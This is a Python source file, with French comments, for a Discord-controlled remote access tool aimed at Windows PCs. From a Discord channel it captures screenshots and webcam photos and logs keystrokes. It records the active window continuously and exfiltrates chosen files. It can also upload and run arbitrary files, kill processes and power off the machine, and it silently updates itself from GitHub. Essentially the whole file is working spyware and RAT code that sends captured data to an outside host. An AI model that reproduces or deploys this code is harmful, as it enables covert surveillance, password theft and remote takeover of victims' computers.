import threading
import time
import win32gui
import win32process
import psutil
from datetime import datetime, timedelta
import sys
import asyncio
import discord
import os
import tkinter as tk
from tkinter import messagebox
import pyautogui
import socket
import requests
import platform
import cv2
import shutil
import tempfile

# ============== VERSION ET CONFIGURATION ==============
CURRENT_VERSION = "1.0.0"  # ⚠️ IMPORTANT : Incrémenter à chaque nouvelle version !
UPDATE_CHECK_INTERVAL = 3600  # 1 heure

# ============== CHARGEMENT CONFIGURATION SÉCURISÉ ==============
try:
    # Essayer de charger le fichier config.py local
    from config import DISCORD_TOKEN, CHANNEL_ID, COMMANDES, GITHUB_USER, GITHUB_REPO
    print("✅ Configuration locale chargée (mode développement)")
except ImportError:
    # Fallback : variables d'environnement (mode production)
    DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
    CHANNEL_ID = int(os.getenv('CHANNEL_ID', '0'))
    COMMANDES = int(os.getenv('COMMANDES', '0'))
    GITHUB_USER = os.getenv('GITHUB_USER', 'USERNAME_INCONNU')
    GITHUB_REPO = os.getenv('GITHUB_REPO', 'discord-remote-bot')
    print("✅ Variables d'environnement chargées (mode production)")

# Vérification des variables critiques
if not DISCORD_TOKEN:
    print("❌ ERREUR CRITIQUE : DISCORD_TOKEN manquant !")
    print("💡 Solution : Créer config.py avec votre nouveau token")
    input("Appuyez sur Entrée pour quitter...")
    sys.exit(1)

if CHANNEL_ID == 0 or COMMANDES == 0:
    print("❌ ERREUR : Channel IDs manquants !")
    print("💡 Vérifiez CHANNEL_ID et COMMANDES dans config.py")
    input("Appuyez sur Entrée pour quitter...")
    sys.exit(1)

# URL de mise à jour (releases publiques)
UPDATE_URL = f"https://github.com/{GITHUB_USER}/{GITHUB_REPO}/releases/latest/download/bot.py"

# Variables globales Discord
discord_loop = asyncio.new_event_loop()
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
keylogger_running = False
keylogger_buffer = []

print(f"🔗 Mise à jour depuis : {GITHUB_USER}/{GITHUB_REPO}")
print(f"🔑 Token Discord : {'✅ Défini' if DISCORD_TOKEN else '❌ Manquant'}")

# ============== SYSTÈME DE MISE À JOUR ==============
class AutoUpdater:
    def __init__(self):
        self.current_file = sys.argv[0]
        self.temp_dir = tempfile.gettempdir()
        self.backup_file = os.path.join(self.temp_dir, "bot_backup.py")
        
    def get_latest_version_github(self):
        """Récupère la dernière version depuis GitHub API"""
        try:
            api_url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/releases/latest"
            response = requests.get(api_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('tag_name', '').replace('v', '')
            elif response.status_code == 404:
                print("⚠️ Repository non trouvé ou aucune release")
            else:
                print(f"⚠️ Erreur API GitHub : {response.status_code}")
        except Exception as e:
            print(f"Erreur vérification version: {e}")
        return None
    
    def is_newer_version(self, online_version):
        """Compare les versions (format x.y.z)"""
        try:
            current = [int(x) for x in CURRENT_VERSION.split('.')]
            online = [int(x) for x in online_version.split('.')]
            
            for i in range(max(len(current), len(online))):
                c = current[i] if i < len(current) else 0
                o = online[i] if i < len(online) else 0
                if o > c:
                    return True
                elif o < c:
                    return False
            return False
        except Exception as e:
            print(f"Erreur comparaison version: {e}")
            return False
    
    def download_update(self):
        """Télécharge depuis les releases publiques"""
        try:
            print(f"📥 Téléchargement depuis : {UPDATE_URL}")
            response = requests.get(UPDATE_URL, timeout=30)
            
            if response.status_code == 200:
                temp_file = os.path.join(self.temp_dir, "bot_new.py")
                with open(temp_file, 'wb') as f:
                    f.write(response.content)
                
                # Vérifier que c'est un fichier Python valide
                try:
                    with open(temp_file, 'r', encoding='utf-8') as f:
                        compile(f.read(), temp_file, 'exec')
                    print("✅ Fichier téléchargé et validé")
                    return temp_file
                except SyntaxError as e:
                    print(f"❌ Fichier Python invalide : {e}")
                    os.remove(temp_file)
                    run_async(send_to_discord("❌ Fichier de mise à jour invalide"))
                    return None
            else:
                print(f"❌ Erreur téléchargement : {response.status_code}")
                run_async(send_to_discord(f"❌ Erreur téléchargement : {response.status_code}"))
                
        except Exception as e:
            print(f"Erreur téléchargement: {e}")
            run_async(send_to_discord(f"❌ Erreur téléchargement : {e}"))
        return None
    
    def backup_current_version(self):
        """Sauvegarde la version actuelle"""
        try:
            shutil.copy2(self.current_file, self.backup_file)
            print("✅ Backup créé")
            return True
        except Exception as e:
            print(f"❌ Erreur backup : {e}")
            run_async(send_to_discord(f"❌ Erreur backup : {e}"))
            return False
    
    def apply_update(self, new_file):
        """Applique la mise à jour avec système de rollback"""
        try:
            print("🔄 Application de la mise à jour...")
            
            # 1. Créer une sauvegarde
            if not self.backup_current_version():
                return False
            
            # 2. Remplacer le fichier
            shutil.copy2(new_file, self.current_file)
            os.remove(new_file)
            
            print("✅ Mise à jour appliquée")
            run_async(send_to_discord("✅ **Mise à jour appliquée !** Redémarrage en 3s..."))
            
            # 3. Redémarrage
            time.sleep(3)
            python = sys.executable
            os.execl(python, python, *sys.argv)
            
        except Exception as e:
            print(f"❌ Erreur application : {e}")
            # Restauration automatique
            try:
                if os.path.exists(self.backup_file):
                    shutil.copy2(self.backup_file, self.current_file)
                    run_async(send_to_discord("🔧 Erreur MAJ - Restauration effectuée"))
            except:
                run_async(send_to_discord("❌❌ ERREUR CRITIQUE"))
            return False
    
    def check_and_update(self):
        """Vérification et mise à jour automatique"""
        try:
            print("🔍 Vérification automatique des MAJ...")
            latest_version = self.get_latest_version_github()
            
            if not latest_version:
                return False
            
            print(f"📦 Actuelle: {CURRENT_VERSION} | En ligne: {latest_version}")
            
            if self.is_newer_version(latest_version):
                print("🎯 Nouvelle version détectée !")
                run_async(send_to_discord(
                    f"🔄 **Mise à jour automatique !**\n"
                    f"📦 Actuelle: {CURRENT_VERSION}\n"
                    f"🆕 Nouvelle: {latest_version}\n"
                    f"📥 Téléchargement..."
                ))
                
                new_file = self.download_update()
                if new_file:
                    return self.apply_update(new_file)
            
            return False
        except Exception as e:
            print(f"Erreur vérification MAJ : {e}")
            return False

# Instance globale
updater = AutoUpdater()

# ============== FONCTIONS UTILITAIRES ==============
async def send_to_discord(message, file_path=None, channel_id=None):
    """Envoie un message sur Discord avec gestion d'erreurs"""
    try:
        await client.wait_until_ready()
        channel = client.get_channel(channel_id or COMMANDES)
        if channel:
            if file_path and os.path.exists(file_path):
                await channel.send(message, file=discord.File(file_path))
                os.remove(file_path)
            else:
                await channel.send(message)
    except Exception as e:
        print(f"Erreur envoi Discord: {e}")

def run_async(coro):
    """Exécute une coroutine dans le thread Discord"""
    return asyncio.run_coroutine_threadsafe(coro, discord_loop)

# ============== COMMANDES SYSTÈME (Vos commandes originales) ==============
class Commands:
    @staticmethod
    def screenshot():
        """Prend une capture d'écran"""
        try:
            file_path = "screenshot.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(file_path)
            run_async(send_to_discord("📸 Capture d'écran :", file_path))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur screenshot : {e}"))

    @staticmethod
    def sysinfo():
        """Récupère les informations système"""
        try:
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('C:')
            
            info = f"""💻 **Informations Système**
🖥️ **OS :** {platform.system()} {platform.release()}
⚙️ **Processeur :** {platform.processor()}
🧠 **CPU Cœurs :** {cpu_count}
🔋 **RAM :** {memory.total // (1024**3)} GB (Utilisé: {memory.percent}%)
💾 **Disque C: :** {disk.total // (1024**3)} GB (Utilisé: {(disk.used/disk.total)*100:.1f}%)"""
            
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur système : {e}"))

    @staticmethod
    def network():
        """Récupère les informations réseau"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            try:
                public_ip = requests.get("https://api.ipify.org", timeout=5).text
            except:
                public_ip = "Non disponible"
            
            info = f"🌐 **Nom d'hôte :** {hostname}\n📍 **IP Locale :** {local_ip}\n🌍 **IP Publique :** {public_ip}"
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur réseau : {e}"))

    @staticmethod
    def tasks():
        """Liste les tâches actives"""
        try:
            file_path = "tasks_list.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        f.write(f"{proc.info['pid']}: {proc.info['name']}\n")
                    except:
                        continue
            
            run_async(send_to_discord("📝 Liste des tâches :", file_path))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur tâches : {e}"))

    @staticmethod
    def time():
        """Affiche l'heure actuelle"""
        try:
            now = datetime.now()
            info = f"⏰ **Heure :** {now.strftime('%H:%M:%S')}\n📅 **Date :** {now.strftime('%d/%m/%Y')}"
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur : {e}"))

    @staticmethod
    def uptime():
        """Affiche le temps d'activité"""
        try:
            boot_time = psutil.boot_time()
            uptime_seconds = time.time() - boot_time
            uptime = str(timedelta(seconds=int(uptime_seconds)))
            run_async(send_to_discord(f"⏱️ **Temps d'activité :** {uptime}"))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur : {e}"))

    @staticmethod
    def desktop():
        """Liste les fichiers du bureau"""
        try:
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            files = os.listdir(desktop_path)[:20]
            file_list = "\n".join([f"📄 {file}" for file in files])
            info = f"🖥️ **Fichiers bureau (max 20):**\n```{file_list}```"
            run_async(send_to_discord(info))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur bureau : {e}"))

    @staticmethod
    def webcam():
        """Prend une photo avec la webcam"""
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                cap.release()
                run_async(send_to_discord("📹 Photo webcam :", "webcam.jpg"))
            else:
                raise Exception("Impossible d'accéder à la webcam")
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur webcam : {e}"))

    @staticmethod
    def volume_up():
        """Augmente le volume"""
        pyautogui.press('volumeup')
        run_async(send_to_discord("🔊 Volume +"))

    @staticmethod
    def volume_down():
        """Diminue le volume"""
        pyautogui.press('volumedown')
        run_async(send_to_discord("🔉 Volume -"))

    @staticmethod
    def mute():
        """Active/désactive le son"""
        pyautogui.press('volumemute')
        run_async(send_to_discord("🔇 Mute/Unmute"))

    @staticmethod
    def lock():
        """Verrouille la session"""
        os.system("rundll32.exe user32.dll,LockWorkStation")
        run_async(send_to_discord("🔒 Session verrouillée"))

    @staticmethod
    def sleep():
        """Met en veille"""
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        run_async(send_to_discord("😴 Mise en veille"))

    @staticmethod
    def restart():
        """Redémarre le système"""
        run_async(send_to_discord("🔄 Redémarrage..."))
        os.system("shutdown /r /f /t 0")

    @staticmethod
    def shutdown():
        """Arrête le système"""
        run_async(send_to_discord("⚡ Arrêt système..."))
        os.system("shutdown /s /t 5")

    @staticmethod
    def kill_process(target):
        """Tue un processus"""
        killed, failed = [], []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == target.lower() or str(proc.info['pid']) == target:
                    proc.kill()
                    killed.append(f"{proc.info['pid']}: {proc.info['name']}")
            except Exception as e:
                failed.append(f"{proc.info['pid']}: {proc.info['name']} ({e})")

        if killed:
            info = "✅ Processus tués :\n```\n" + "\n".join(killed) + "\n```"
        else:
            info = f"❌ Aucun processus trouvé : `{target}`"
        
        if failed:
            info += "\n⚠️ Erreurs :\n```\n" + "\n".join(failed[:5]) + "\n```"
        
        run_async(send_to_discord(info))

    @staticmethod
    def show_message(text):
        """Affiche un message popup"""
        try:
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            messagebox.showinfo("Message", text)
            root.destroy()
            run_async(send_to_discord(f"✅ Message affiché : '{text}'"))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur message : {e}"))

    @staticmethod
    def download_file(chemin):
        """Télécharge un fichier"""
        try:
            if os.path.exists(chemin):
                file_size = os.path.getsize(chemin)
                if file_size > 25 * 1024 * 1024:  # 25MB
                    run_async(send_to_discord(f"❌ Fichier trop volumineux : {file_size / (1024*1024):.1f}MB"))
                else:
                    run_async(send_to_discord(f"📁 Téléchargement : `{os.path.basename(chemin)}`", chemin))
            else:
                run_async(send_to_discord(f"❌ Fichier introuvable : `{chemin}`"))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur téléchargement : {e}"))

    @staticmethod
    def run_file(chemin):
        """Exécute un fichier"""
        try:
            if os.path.exists(chemin):
                os.startfile(chemin)
                run_async(send_to_discord(f"✅ Exécution : `{chemin}`"))
            else:
                run_async(send_to_discord(f"❌ Fichier introuvable : `{chemin}`"))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur exécution : {e}"))

# ============== COMMANDES DE MISE À JOUR ==============
class UpdateCommands:
    @staticmethod
    def check_updates():
        """Vérification manuelle"""
        run_async(send_to_discord(f"🔍 **Vérification MAJ...**\nVersion: {CURRENT_VERSION}"))
        
        latest = updater.get_latest_version_github()
        if latest:
            if updater.is_newer_version(latest):
                run_async(send_to_discord(f"🆕 **Nouvelle version !**\nDisponible: {latest}\nUtilisez `*forceupdate`"))
            else:
                run_async(send_to_discord(f"✅ **À jour !** Version: {latest}"))
        else:
            run_async(send_to_discord("❌ Impossible de vérifier GitHub"))
    
    @staticmethod
    def force_update():
        """Force la mise à jour"""
        run_async(send_to_discord("🔄 **Mise à jour forcée...**"))
        new_file = updater.download_update()
        if new_file:
            updater.apply_update(new_file)
        else:
            run_async(send_to_discord("❌ Échec MAJ"))
    
    @staticmethod
    def rollback():
        """Retour version précédente"""
        try:
            if os.path.exists(updater.backup_file):
                shutil.copy2(updater.backup_file, updater.current_file)
                run_async(send_to_discord("✅ **Rollback !** Redémarrage..."))
                time.sleep(2)
                python = sys.executable
                os.execl(python, python, *sys.argv)
            else:
                run_async(send_to_discord("❌ Pas de backup"))
        except Exception as e:
            run_async(send_to_discord(f"❌ Erreur rollback : {e}"))

# ============== VUES DISCORD (VOS BOUTONS ORIGINAUX + MAJ) ==============
class MainControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='📸 Screenshot', style=discord.ButtonStyle.primary)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("📸 Capture...", ephemeral=True)
        threading.Thread(target=Commands.screenshot).start()

    @discord.ui.button(label='💻 SysInfo', style=discord.ButtonStyle.secondary)
    async def sysinfo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("💻 Infos...", ephemeral=True)
        threading.Thread(target=Commands.sysinfo).start()

    @discord.ui.button(label='🌐 Network', style=discord.ButtonStyle.secondary)
    async def network_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🌐 Réseau...", ephemeral=True)
        threading.Thread(target=Commands.network).start()

    @discord.ui.button(label='📝 Tasks', style=discord.ButtonStyle.secondary)
    async def tasks_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("📝 Tâches...", ephemeral=True)
        threading.Thread(target=Commands.tasks).start()

    @discord.ui.button(label='⏰ Time', style=discord.ButtonStyle.secondary)
    async def time_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏰ Heure...", ephemeral=True)
        threading.Thread(target=Commands.time).start()

class AudioControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🔊 Volume +', style=discord.ButtonStyle.success)
    async def vol_up_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔊 Volume +", ephemeral=True)
        Commands.volume_up()

    @discord.ui.button(label='🔉 Volume -', style=discord.ButtonStyle.success)
    async def vol_down_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔉 Volume -", ephemeral=True)
        Commands.volume_down()

    @discord.ui.button(label='🔇 Mute', style=discord.ButtonStyle.success)
    async def mute_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔇 Mute", ephemeral=True)
        Commands.mute()

class SystemControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🔒 Lock', style=discord.ButtonStyle.secondary)
    async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔒 Lock...", ephemeral=True)
        Commands.lock()

    @discord.ui.button(label='😴 Sleep', style=discord.ButtonStyle.secondary)
    async def sleep_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("😴 Veille...", ephemeral=True)
        Commands.sleep()

    @discord.ui.button(label='🔄 Restart', style=discord.ButtonStyle.danger)
    async def restart_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⚠️ Restart...", ephemeral=True)
        Commands.restart()

    @discord.ui.button(label='⚡ Shutdown', style=discord.ButtonStyle.danger)
    async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⚠️ Shutdown...", ephemeral=True)
        Commands.shutdown()

    @discord.ui.button(label='⏱️ Uptime', style=discord.ButtonStyle.secondary)
    async def uptime_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏱️ Uptime...", ephemeral=True)
        threading.Thread(target=Commands.uptime).start()

class FileControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🖥️ Desktop', style=discord.ButtonStyle.secondary)
    async def desktop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🖥️ Bureau...", ephemeral=True)
        threading.Thread(target=Commands.desktop).start()

    @discord.ui.button(label='📹 Webcam', style=discord.ButtonStyle.primary)
    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("📹 Webcam...", ephemeral=True)
        threading.Thread(target=Commands.webcam).start()

# NOUVEAU : Vue contrôles de mise à jour
class UpdateControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🔍 Check MAJ', style=discord.ButtonStyle.primary)
    async def check_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔍 Vérification...", ephemeral=True)
        threading.Thread(target=UpdateCommands.check_updates).start()

    @discord.ui.button(label='🔄 Force MAJ', style=discord.ButtonStyle.success)
    async def force_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔄 Forçage...", ephemeral=True)
        threading.Thread(target=UpdateCommands.force_update).start()

    @discord.ui.button(label='⏪ Rollback', style=discord.ButtonStyle.danger)
    async def rollback_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏪ Rollback...", ephemeral=True)
        threading.Thread(target=UpdateCommands.rollback).start()

# ============== GESTIONNAIRE KEYLOGGER (Votre code original) ==============
def manage_keylogger(action):
    global keylogger_running, keylogger_buffer
    
    if action == "start":
        if keylogger_running:
            run_async(send_to_discord("❌ Keylogger déjà actif"))
            return
            
        keylogger_running = True
        keylogger_buffer = []
        
        def keylogger_worker():
            global keylogger_running, keylogger_buffer
            try:
                from pynput import keyboard
                
                def on_press(key):
                    if keylogger_running:
                        keylogger_buffer.append(str(key).replace("'", ""))
                
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                
                while keylogger_running:
                    if keylogger_buffer:
                        logs = "".join(keylogger_buffer[:100])
                        keylogger_buffer = keylogger_buffer[100:]
                        run_async(send_to_discord(f"⌨️ Keylog:\n```{logs}```", channel_id=CHANNEL_ID))
                    time.sleep(10)
                
                listener.stop()
            except Exception as e:
                run_async(send_to_discord(f"❌ Erreur keylogger : {e}"))
        
        threading.Thread(target=keylogger_worker, daemon=True).start()
        run_async(send_to_discord("✅ Keylogger démarré"))
    
    elif action == "stop":
        if keylogger_running:
            keylogger_running = False
            run_async(send_to_discord("🛑 Keylogger arrêté"))
        else:
            run_async(send_to_discord("❌ Keylogger non actif"))

# ============== LOGGER ACTIVITÉ (Votre code original) ==============
def activity_logger():
    last_window = None
    last_process = None
    start_time = time.time()

    while True:
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                process = psutil.Process(pid)
                process_name = process.name()
                window_title = win32gui.GetWindowText(hwnd)
                
                if window_title != last_window and window_title:
                    duration = time.time() - start_time
                    if last_window:
                        log_line = (f"[{datetime.now().strftime('%H:%M:%S')}] "
                                  f"**{last_process}** | \"{last_window}\" | "
                                  f"Durée: {time.strftime('%H:%M:%S', time.gmtime(duration))}")
                        run_async(send_to_discord(log_line, channel_id=CHANNEL_ID))
                    
                    last_window = window_title
                    last_process = process_name
                    start_time = time.time()
            
            time.sleep(1)
        except:
            time.sleep(1)

# ============== VÉRIFICATION AUTOMATIQUE DES MAJ ==============
def auto_update_checker():
    """Thread de vérification automatique des mises à jour"""
    print("⏰ Vérification auto-MAJ démarrée (attente 5 min)...")
    time.sleep(300)  # Attendre 5 minutes après le démarrage
    
    while True:
        try:
            current_time = datetime.now().strftime('%H:%M:%S')
            print(f"[{current_time}] 🔍 Vérification automatique MAJ...")
            
            # Vérifier et appliquer automatiquement
            if updater.check_and_update():
                print("🎯 MAJ appliquée - redémarrage imminent")
                break  # Le bot va redémarrer
            
            print(f"✅ Prochaine vérif dans {UPDATE_CHECK_INTERVAL//60} min")
            time.sleep(UPDATE_CHECK_INTERVAL)
            
        except Exception as e:
            print(f"❌ Erreur auto-update : {e}")
            time.sleep(3600)  # Retry dans 1h

# ============== GESTIONNAIRE COMMANDES (Votre logique originale + MAJ) ==============
COMMAND_MAP = {
    "*screen": Commands.screenshot,
    "*sysinfo": Commands.sysinfo,
    "*network": Commands.network,
    "*tasks": Commands.tasks,
    "*time": Commands.time,
    "*uptime": Commands.uptime,
    "*desktop": Commands.desktop,
    "*cam": Commands.webcam,
    "*volumeup": Commands.volume_up,
    "*volumedown": Commands.volume_down,
    "*mute": Commands.mute,
    "*lock": Commands.lock,
    "*sleep": Commands.sleep,
    "*restart": Commands.restart,
    "*shutdown": Commands.shutdown,
    # NOUVELLES COMMANDES MAJ
    "*update": UpdateCommands.check_updates,
    "*forceupdate": UpdateCommands.force_update,
    "*rollback": UpdateCommands.rollback,
}

@client.event
async def on_ready():
    """Événement de connexion réussie"""
    print(f"✅ Bot connecté : {client.user}")
    await send_to_discord(f"🚀 **Bot System v{CURRENT_VERSION}** démarré !\n⏰ {datetime.now().strftime('%H:%M:%S')}")

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.lower().strip()

    # Commande Help MISE À JOUR
    if content == "*help":
        help_text = f"""🤖 **Bot System v{CURRENT_VERSION}** - Interface de Contrôle

**📋 Commandes disponibles :**
`*screen` `*sysinfo` `*network` `*time` `*uptime` `*tasks`
`*desktop` `*cam` `*volumeup/down/mute` `*lock` `*sleep`
`*shutdown` `*restart` `*kill <proc>` `*msg <texte>`
`*download <path>` `*upload <path>` `*run <path>`
`*keylogger start/stop`

**🔄 Mises à jour :**
`*update` `*forceupdate` `*rollback`

**🔗 Repository:** `{GITHUB_USER}/{GITHUB_REPO}`"""
        
        await message.channel.send(help_text)
        await message.channel.send("**📊 Contrôles Principaux**", view=MainControlView())
        await message.channel.send("**🔊 Audio**", view=AudioControlView())
        await message.channel.send("**⚙️ Système**", view=SystemControlView())
        await message.channel.send("**📁 Fichiers**", view=FileControlView())
        await message.channel.send("**🔄 Mises à Jour**", view=UpdateControlView())
        return

    # Commandes simples
    if content in COMMAND_MAP:
        await message.channel.send(f"⚡ Exécution de `{content}`...")
        threading.Thread(target=COMMAND_MAP[content]).start()
        return

    # Commandes avec paramètres (votre logique originale)
    if content.startswith("*kill "):
        target = content[6:].strip()
        if target:
            await message.channel.send(f"⚠️ Kill processus `{target}`...")
            threading.Thread(target=Commands.kill_process, args=(target,)).start()
        else:
            await message.channel.send("❌ Usage : `*kill nom_processus` ou `*kill PID`")
        return

    if content.startswith("*msg "):
        text = message.content[5:].strip()
        if text:
            await message.channel.send("💬 Affichage message...")
            threading.Thread(target=Commands.show_message, args=(text,)).start()
        else:
            await message.channel.send("❌ Usage : `*msg votre message`")
        return

    if content.startswith("*download "):
        path = message.content[10:].strip()
        if path:
            await message.channel.send("📂 Téléchargement...")
            threading.Thread(target=Commands.download_file, args=(path,)).start()
        else:
            await message.channel.send("❌ Usage : `*download chemin_fichier`")
        return

    if content.startswith("*run "):
        path = message.content[5:].strip()
        if path:
            await message.channel.send("⚡ Exécution...")
            threading.Thread(target=Commands.run_file, args=(path,)).start()
        else:
            await message.channel.send("❌ Usage : `*run chemin_fichier`")
        return

    if content.startswith("*upload "):
        if message.attachments:
            destination = message.content[8:].strip()
            await message.channel.send("📤 Upload en cours...")
            # Traitement upload simplifié
            for attachment in message.attachments:
                try:
                    response = requests.get(attachment.url)
                    file_path = os.path.join(destination or ".", attachment.filename)
                    os.makedirs(os.path.dirname(file_path) or ".", exist_ok=True)
                    with open(file_path, 'wb') as f:
                        f.write(response.content)
                    await message.channel.send(f"✅ Uploadé : `{file_path}`")
                except Exception as e:
                    await message.channel.send(f"❌ Erreur : {e}")
        else:
            await message.channel.send("❌ Attachez des fichiers à votre message")
        return

    if content.startswith("*keylogger "):
        action = content.split()[1] if len(content.split()) > 1 else ""
        if action in ["start", "stop"]:
            await message.channel.send(f"⚙️ Keylogger {action}...")
            threading.Thread(target=manage_keylogger, args=(action,)).start()
        else:
            await message.channel.send("❌ Usage : `*keylogger start` ou `*keylogger stop`")

def start_discord_bot():
    asyncio.set_event_loop(discord_loop)
    discord_loop.run_until_complete(client.start(DISCORD_TOKEN))

# ============== LANCEMENT PRINCIPAL ==============
if __name__ == "__main__":
    print(f"🚀 Démarrage Bot System v{CURRENT_VERSION}")
    print(f"🔗 Repository : {GITHUB_USER}/{GITHUB_REPO}")
    
    # Démarrer Discord
    threading.Thread(target=start_discord_bot, daemon=True).start()
    time.sleep(3)
    
    # Démarrer le logger d'activité (votre fonctionnalité)
    print("📊 Démarrage logger activité...")
    threading.Thread(target=activity_logger, daemon=True).start()
    
    # NOUVEAU : Démarrer vérification automatique MAJ
    print("🔄 Démarrage vérification auto-update...")
    threading.Thread(target=auto_update_checker, daemon=True).start()

    try:
        print("✅ Bot prêt ! Ctrl+C pour arrêter.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Arrêt du bot...")
        sys.exit(0)